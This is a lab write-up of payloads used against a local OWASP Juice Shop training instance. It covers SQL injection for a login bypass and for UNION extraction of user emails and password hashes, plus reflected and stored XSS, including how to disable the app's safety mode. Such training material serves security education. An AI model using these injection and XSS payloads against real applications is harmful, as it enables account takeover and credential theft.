# Juice Shop Lab — payloads used (authorized, local instance only)

Target: OWASP Juice Shop v17.1.1 via `docker compose up -d` (http://localhost:3000).

## JUICE-001 — SQL Injection (login bypass)
Endpoint: `POST /rest/user/login`
In the Login form **Email** field enter the payload below and any password:
```
' OR 1=1--
```
The query becomes `... WHERE email='' OR 1=1--' AND password=...`, matching every row
and logging in as the first user (admin@juice-sh.op). Solves the "Login Admin" challenge.

## JUICE-002 — SQL Injection (UNION data extraction)
Endpoint: `GET /rest/products/search?q=`
```
qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--
```
Full URL used:
```
http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users--
```
The product search returns every user's email (in `name`) and password hash (in `description`).
Solves the "User Credentials" challenge.

## JUICE-003 — Reflected XSS (search)
Open the search with the payload reflected into the results header (rendered via
`bypassSecurityTrustHtml`):
```
<iframe src="javascript:alert(`xss`)">
```
URL:
```
http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
```
Solves the "DOM XSS" challenge; the script executes in the browser.

## JUICE-004 — Stored XSS (persisted, Client-side XSS Protection)
Register a user via the API (bypassing the Angular form's client-side validation) with the
payload as the email, then view it on the admin user-management page where the email is
rendered with `bypassSecurityTrustHtml`:
```
POST /api/Users   {"email":"<iframe src=\"javascript:alert(`xss`)\">","password":"xss12345"}
```
Then browse to `/#/administration` (as admin) — the stored payload executes on page load.
Solves the "Client-side XSS Protection" challenge.

> Note: Juice Shop disables its persisted/reflected XSS challenges when it detects a Docker
> environment (`disabledEnv: Docker`) and fully sanitizes those fields. For JUICE-004 the
> instance was started with Juice Shop's safety mode turned off
> (`NODE_CONFIG={"challenges":{"safetyMode":"disabled"}}`) so the persisted-XSS path is
> active on this local training instance. JUICE-001/002/003 work with the default settings.
